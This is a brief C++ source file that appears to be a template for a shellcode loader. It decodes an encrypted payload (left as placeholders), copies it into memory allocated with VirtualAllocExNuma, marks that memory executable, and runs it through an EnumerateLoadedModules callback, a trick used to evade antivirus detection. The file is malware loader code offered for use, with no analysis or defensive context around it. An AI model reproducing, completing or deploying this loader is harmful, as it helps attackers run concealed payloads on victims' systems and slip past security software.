#include <windows.h>
#include <dbghelp.h>
#include "base64.h"
#include "syscall.h"
#pragma comment(lib, "dbghelp.lib")

char Ciphertext[] = "<Ciphertext>";

int main() {
	LPVOID addr = VirtualAllocExNuma(GetCurrentProcess(), NULL, sizeof(Ciphertext), MEM_COMMIT, PAGE_READWRITE, 0);

	<decode>

	::RtlMoveMemory(addr, shellcode, sizeof(Ciphertext));

	DWORD pflOldProtect;
	VirtualProtect(addr, sizeof(Ciphertext), PAGE_EXECUTE_READ, &pflOldProtect);

	::EnumerateLoadedModules(::GetCurrentProcess(), (PENUMLOADED_MODULES_CALLBACK)addr, NULL);

}